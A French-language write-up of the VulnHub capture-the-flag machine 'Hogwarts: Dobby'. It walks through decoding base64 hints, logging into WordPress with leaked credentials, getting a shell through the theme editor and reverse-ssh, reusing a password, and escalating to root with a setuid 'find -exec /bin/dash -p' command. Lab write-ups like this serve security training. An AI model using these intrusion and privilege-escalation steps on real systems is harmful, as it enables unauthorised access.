---
title: "Solution du CTF Hogwarts: Dobby de VulnHub"
tags: [VulnHub, CTF]
---

[Hogwarts: Dobby](https://vulnhub.com/entry/hogwarts-dobby,597/) a été créé par le même auteur que le CTF [Bellatrix]({% link _posts/2022-11-19-Solution-du-CTF-Hogwarts-Bellatrix-de-VulnHub.md %}).

On y retrouve cette idée de jeu de piste qui ne m'enchante pas, mais comme le précédent ça reste acceptable.

## Harry Potter et l'encodage secret

Seul un port 80 est ouvert sur la VM et livre la page par défaut d'Apache... Sauf que, je remarque que le navigateur affiche un titre inhabituel pour la page. Il y a en effet deux indices dans le code HTML :

```html
    <title>Draco:dG9vIGVhc3kgbm8/IFBvdHRlcg==</title>
    --- snip ---
    <!--
     See: /alohomora
  -->
```

Le base64 se décode en `too easy no? Potter` et à l'adresse mentionnée en commentaire, on trouve ce message :

> Draco's password is his house ;)

Via énumération je trouve aussi le fichier `http://192.168.56.149/log` avec le contenu suivant :

> pass:OjppbGlrZXNvY2tz
> hint --> /DiagonAlley

Le base64 se décode en `::ilikesocks` et le path mène cette fois à une installation de *Wordpress*.

Sur l'interface administrateur du CMS on parvient à se connecter avec les identifiants `Draco` / `slytherin`.

Depuis l'interface, on retrouve l'éditeur de thème permettant de modifier le code PHP malgré le fait que l'interface soit configurée en espagnol.

L'opération est classique donc je n'entrerais pas dans les détails. Je parviens après upload de `reverse-ssh` à avoir un shell interactif.

## Harry Potter et les pages de manuel

L'exécutable `cat` a été déplacé, je le retrouve dans `/usr/lib/klibc/bin/`. En corrigeant la variable d'environnement PATH tout revient dans l'ordre.

La configuration Wordpress ne m'apprend rien d'intéressant :

```php
/** The name of the database for WordPress */
define( 'DB_NAME', 'WordPressDB' );

/** MySQL database username */
define( 'DB_USER', 'Draco' );

/** MySQL database password */
define( 'DB_PASSWORD', 'slytherin' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
```

Il y a un utilisateur `dobby` sur le système et le mot de passe `ilikesocks` fonctionne.

Dans son répertoire personnel se trouve un flag :

```console
dobby@HogWarts:~$ cat flag1.txt 
"Harry potter this year should not go to the school of wizardry"

flag1{28327a4964cb391d74111a185a5047ad}
```

Il y a deux binaires setuid inhabituels :

```console
dobby@HogWarts:~$ find / -type f -perm -u+s 2> /dev/null
--- snip ---
/usr/bin/base32
/usr/bin/gpasswd
/usr/bin/find
/usr/bin/pkexec
--- snip ---
```

`base32` peut servir à lire les fichiers des autres utilisateurs, mais pas à en écrire.

On se tournera alors vers la commande `find` avec son option `-exec` bien connue :

```console
dobby@HogWarts:~$ find /etc/ -name issue -exec /bin/dash -p \;
# id
uid=1000(dobby) gid=1000(dobby) euid=0(root) grupos=1000(dobby),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),132(lxd),133(sambashare)
# cd /root
# ls
proof.txt
# cat proof.txt 
                                         _ __
        ___                             | '  \
   ___  \ /  ___         ,'\_           | .-. \        /|
   \ /  | |,'__ \  ,'\_  |   \          | | | |      ,' |_   /|
 _ | |  | |\/  \ \ |   \ | |\_|    _    | |_| |   _ '-. .-',' |_   _
// | |  | |____| | | |\_|| |__    //    |     | ,'_`. | | '-. .-',' `. ,'\_
\\_| |_,' .-, _  | | |   | |\ \  //    .| |\_/ | / \ || |   | | / |\  \|   \
 `-. .-'| |/ / | | | |   | | \ \//     |  |    | | | || |   | | | |_\ || |\_|
   | |  | || \_| | | |   /_\  \ /      | |`    | | | || |   | | | .---'| |
   | |  | |\___,_\ /_\ _      //       | |     | \_/ || |   | | | |  /\| |
   /_\  | |           //_____//       .||`      `._,' | |   | | \ `-' /| |
        /_\           `------'        \ |   AND        `.\  | |  `._,' /_\
                                       \|       THE          `.\
                                            _  _  _  _  __ _  __ _ /_
                                           (_`/ \|_)/ '|_ |_)|_ |_)(_
                                           ._)\_/| \\_,|__| \|__| \ _)
                                                           _ ___ _      _
                                                          (_` | / \|\ ||__
                                                          ._) | \_/| \||___


root{63a9f0ea7bb98050796b649e85481845!!}
```
